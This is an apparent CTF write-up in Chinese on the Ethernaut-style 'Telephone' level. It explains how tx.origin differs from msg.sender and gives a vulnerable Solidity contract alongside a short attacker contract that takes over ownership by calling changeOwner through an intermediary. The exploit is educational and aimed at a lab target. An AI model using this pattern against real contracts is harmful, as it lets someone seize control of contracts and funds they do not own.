這關卡簡單但很有教育意義，主要是要我們理解 `msg.sender` 和 `tx.origin` 的區別。

### 題目

在這個關卡中，我們的目標是取得 `Telephone` 合約的所有權。
這個合約的 `changeOwner` 函數中有一個條件限制，只有在 `tx.origin` 不等於 `msg.sender` 的情況下，才能更改合約的所有者。這裡的 `tx.origin` 是最初發送交易的外部帳戶地址，而 `msg.sender` 則是直接調用合約的地址，可以是外部帳戶或其他合約。

### 合約

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

這個合約的邏輯很簡單，在 `changeOwner` 函數中，只有當 `tx.origin` 不等於 `msg.sender` 時，才能更改所有者。因此，如果你直接從外部帳戶調用 `changeOwner`，這個條件是不會通過的。但是，如果我們通過一個合約來調用 `changeOwner`，那麼 `msg.sender` 就會是那個合約的地址，而 `tx.origin` 還是最初發起交易的外部帳戶地址，這樣就能通過條件檢查。

### Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {

    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        Telephone(challengeInstance).changeOwner(msg.sender);
    }
}
```

我們只需要讓 `TelephoneAttacker` 合約來呼叫 `Telephone` 合約的 `changeOwner` 函數。由於 `msg.sender` 在這個過程中會變成 `TelephoneAttacker` 合約的地址，而 `tx.origin` 是最初的外部帳戶地址，因此可以成功通過 `tx.origin != msg.sender` 的條件檢查，並將 `Telephone` 合約的所有權轉移到我們的地址。
